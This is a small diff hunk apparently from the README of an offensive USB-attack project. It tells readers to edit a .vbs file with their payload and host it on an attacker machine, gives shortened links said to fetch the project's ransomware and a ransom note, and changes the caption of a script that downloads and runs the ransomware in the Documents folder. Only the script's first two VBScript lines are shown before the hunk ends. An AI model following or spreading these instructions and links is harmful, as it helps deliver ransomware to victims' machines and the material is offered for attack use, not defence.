@@ -296,7 +296,7 @@ After testing alot, we loved the stealth this kind of attack gives, so we tried 
 Just modify the .vbs file with the payload you want and enjoy your USB attacks! (remember to host the downloadable payloads in your attacker machines folder! (or replace the attacker IP with the source of the malware like for example https://tinyurl.com/36xacafn is the source of the ransomware from our GitHub while https://tinyurl.com/3va6t8n7 is the raport.txt)
 
 
-Script that downloads the ransomware that executes in the TEMP folder + raport.txt.
+Script that downloads the ransomware + raport.txt and executes it in the Documents folder.
 ```
 Set objShell = CreateObject("Wscript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
